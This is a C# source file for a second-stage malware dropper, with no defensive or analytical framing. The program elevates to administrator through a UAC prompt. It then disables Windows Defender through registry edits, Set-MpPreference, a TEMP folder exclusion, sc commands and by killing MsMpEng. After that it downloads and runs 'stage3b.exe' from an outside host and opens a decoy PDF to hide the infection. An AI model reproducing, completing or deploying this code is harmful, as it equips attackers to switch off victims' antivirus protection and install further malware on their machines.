using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Security.Principal;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try {
                File.AppendAllText(Path.GetTempPath() + "stage2_log.txt",
                    DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            } catch { }
        }

        static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static int RunProcess(string fileName, string arguments, out string output, bool wait = true)
        {
            output = "";
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = arguments;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    if (wait)
                    {
                        output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit(30000);
                        return p.ExitCode;
                    }
                    else
                    {
                        // Fire and forget
                        return 0;
                    }
                }
            } catch (Exception ex) {
                output = ex.Message;
                return -1;
            }
        }

        static void Main()
        {
            Log("=== Stage2 started ===");

            // Elevate if not admin
            if (!IsAdministrator())
            {
                Log("Not running as administrator. Attempting to elevate...");
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = Process.GetCurrentProcess().MainModule.FileName;
                    psi.UseShellExecute = true;
                    psi.Verb = "runas";
                    Process.Start(psi);
                } catch {
                    Log("Elevation failed. Exiting.");
                }
                return;
            }
            Log("Running with administrator privileges.");

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS configured");

                // ========== DISABLE WINDOWS DEFENDER ==========
                Log("Starting Defender disable procedure...");

                // 1. Disable Tamper Protection via PowerShell (registry)
                int tpResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name 'TamperProtection' -Value 0 -Force\"", out string tpOut);
                Log("Tamper protection registry result: " + tpResult + " - " + tpOut);
                Thread.Sleep(3000);

                // 2. Disable real-time monitoring (properly with $true)
                int mpResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", out string mpOut);
                Log("Set-MpPreference result: " + mpResult + " - " + mpOut);
                Thread.Sleep(5000);

                // 3. Add exclusion for temp folder (so even if Defender is alive, it won't scan our files)
                int exclResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Add-MpPreference -ExclusionPath $env:TEMP\"", out string exclOut);
                Log("Exclusion added: " + exclResult + " - " + exclOut);

                // 4. Stop and disable Windows Defender service via SC (with retry)
                int scStop = RunProcess("sc.exe", "stop WinDefend", out string scStopOut);
                Log("SC stop result: " + scStop + " - " + scStopOut);
                Thread.Sleep(5000);
                int scConfig = RunProcess("sc.exe", "config WinDefend start= disabled", out string scConfigOut);
                Log("SC config result: " + scConfig + " - " + scConfigOut);

                // 5. If SC fails, try disabling via registry (more direct)
                if (scStop != 0 || scConfig != 0)
                {
                    Log("SC commands failed, trying registry method...");
                    int regDisable = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinDefend' -Name 'Start' -Value 4 -Force\"", out string regDisableOut);
                    Log("Registry disable result: " + regDisable + " - " + regDisableOut);
                    // Also set DisableAntiSpyware policy
                    RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Force\"", out string _);
                }

                // 6. Force kill MsMpEng.exe if it's still running (now with more chance after tamper off)
                try {
                    foreach (var proc in Process.GetProcessesByName("MsMpEng"))
                    {
                        proc.Kill();
                        Log("MsMpEng.exe killed.");
                    }
                } catch (Exception ex) {
                    Log("Error killing MsMpEng: " + ex.Message);
                }

                // 7. Verify Defender is off (loop with retries)
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 10)
                {
                    int checkResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"if ((Get-Service WinDefend -ErrorAction SilentlyContinue).Status -eq 'Running') { exit 1 } else { exit 0 }\"", out string checkOut);
                    if (checkResult == 0)
                    {
                        defenderRunning = false;
                        Log("WinDefend is stopped.");
                    }
                    else
                    {
                        Log("WinDefend still running, waiting 10 more seconds... (attempt " + (retries+1) + ")");
                        Thread.Sleep(10000);
                        retries++;
                    }
                }

                if (defenderRunning)
                    Log("Warning: Defender may still be active, but exclusions should allow execution...");

                // ========== DOWNLOAD AND RUN FINAL PAYLOAD ==========
                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                string url = "https://domenca.vercel.app/generated/payloads/stage3b.exe";
                string path = Path.GetTempPath() + "stage3b.exe";
                Log("Downloading stage3b from: " + url);
                client.DownloadFile(url, path);
                Log("Downloaded stage3b.exe, executing...");
                Process.Start(path);
                Log("stage3b.exe launched");

                // Decoy PDF
                client.DownloadFile("https://domenca.vercel.app/generated/decoy.pdf", "decoy.pdf");
                Process.Start("decoy.pdf");
                Log("Decoy PDF opened");
            }
            catch (Exception ex)
            {
                Log("ERROR: " + ex.Message);
                if (ex.InnerException != null)
                    Log("INNER ERROR: " + ex.InnerException.Message);
            }
            Log("=== Stage2 finished ===");
        }
    }
}
